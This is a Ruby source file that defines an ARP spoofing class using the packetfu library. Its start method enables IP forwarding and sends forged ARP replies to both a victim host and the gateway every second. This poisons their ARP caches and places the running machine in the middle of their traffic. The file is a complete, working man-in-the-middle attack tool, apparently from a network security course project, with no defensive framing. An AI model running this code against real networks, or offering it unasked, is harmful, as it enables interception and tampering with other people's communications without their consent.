#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# arp.rb
#
# ARP Spoofing Class
#
# Author: Karl Castillo
#
# Date: October 26, 2012
#
# Functions:
# initialize - initialize the class
# start - start spoofing
# stop - stop spoofing
#
# Revisions: (Date and Description)
# 
# October 26, 2012
# Removed send and added a super class Spoof
#
# Notes:
#
#-------------------------------------------------------------------------------
require 'rubygems'
require 'packetfu'
require File.dirname(__FILE__) + '/spoof.rb'

class ARPSpoof < Spoof
    
    #---------------------------------------------------------------------------
    # initialize
    #
    # Initialization of the ARP Spoofer class.
    #
    # victim_ip - Victim's IP Address
    # victim_mac - Victim's MAC Address
    # iface - NIC Device (default = "em1")
    # opcode - ARP Opcode (default = 2)
    # spoof - true to start spoofing, false to not start (default = false)
    #
    # Revisions: (Date and Description)
    # 
    # October 26, 2012
    # Revised argument list to victim_ip, victim mac, gateway, iface, opcode
    # and spoof
    #
    # Added a spoof if statement. If spoof is true, start ARP Poisoning.
    #
    # Notes:
    #---------------------------------------------------------------------------
    def initialize(victim_ip, victim_mac, 
                   gateway = `ip route show`.match(/default.*/)[0].match(/\d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d?/)[0], 
                   iface = "em1", opcode = 2, 
                   spoof = false)
                   
        cfg = PacketFu::Utils.whoami?(:iface => iface) 
        
        @victim_packet = PacketFu::ARPPacket.new
        @router_packet = PacketFu::ARPPacket.new
        @interface = iface

        @victim_packet.eth_saddr = cfg[:eth_saddr]
        @victim_packet.eth_daddr = victim_mac
        @victim_packet.arp_saddr_mac = cfg[:eth_saddr]
        @victim_packet.arp_daddr_mac = victim_mac
        @victim_packet.arp_saddr_ip = gateway
        @victim_packet.arp_daddr_ip = victim_ip
        @victim_packet.arp_opcode = opcode.to_i

        @router_packet.eth_saddr = cfg[:eth_saddr]
        @router_packet.eth_daddr = cfg[:eth_daddr]
        @router_packet.arp_saddr_mac = cfg[:eth_saddr]
        @router_packet.arp_daddr_mac = cfg[:eth_daddr]
        @router_packet.arp_saddr_ip = victim_ip
        @router_packet.arp_daddr_ip = gateway
        @router_packet.arp_opcode = opcode.to_i
        
        # Start spoofing if start is true
        if spoof then
            start
        end # if
        
    end # initialize
    
    #---------------------------------------------------------------------------
    # start
    #
    # Start ARP poisoning to the target machine
    #
    # Revisions: (Date and Description)
    #
    # October 26, 2012
    # Changed how packet is being sent from send to send(packet)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def start
        puts "ARP Poisoning starting..."
        if @running then
            puts "Already running ARP Poisoning"
            return
        end
        @running = true
        # Enable IP forwarding
        `echo 1 > /proc/sys/net/ipv4/ip_forward`
        while(@running)
            sleep 1
            send(@victim_packet, @interface)
            send(@router_packet, @interface)
        end # while
    end # start
    
    #---------------------------------------------------------------------------
    # stop
    #
    # Stop ARP poisoning
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def stop
        `echo 0 > /proc/sys/net/ipv4/ip_forward`
        @running = false
    end # stop
end
